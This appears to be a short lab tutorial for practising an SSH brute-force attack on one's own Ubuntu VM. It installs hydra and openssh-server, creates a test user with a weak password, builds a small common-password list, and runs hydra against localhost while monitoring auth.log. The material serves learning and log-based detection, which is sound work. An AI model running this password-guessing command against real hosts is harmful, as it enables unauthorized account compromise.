## Prerequisites
- Ubuntu VM (VMware/VirtualBox)
- Internet connection for installing tools
- Terminal access with sudo privileges

## Step 1: Install Required Tools
```bash
sudo apt update
sudo apt install -y openssh-server hydra

## Step 2: Create Test User
sudo useradd -m testuser
sudo passwd testuser
# Set password to: BadPasswd123

## Step 3: create password list
nano ~/passwords.txt(I used gedit;)
  - in file along with the testuser password write other dummy passwords as well.
  Ex: 
      123456
      password
      qwerty
      abc123
      admin
      welcome
      letmein
      monkey
      dragon
      BadPasswd123

## Step 4: verfiy SSH:
sudo systemctl status ssh
# If not running: sudo systemctl start ssh
ssh testuser@127.0.0.1
# Password: BadPasswd123 #(whatever the password you set)

In a seperate terminal open log moniter:
  sudo tail -f /var/log/auth.log
In you first terminal launch the attack:
  hydra -l testuser -P ~/passwords.txt ssh://127.0.0.1 -t 4 -vV



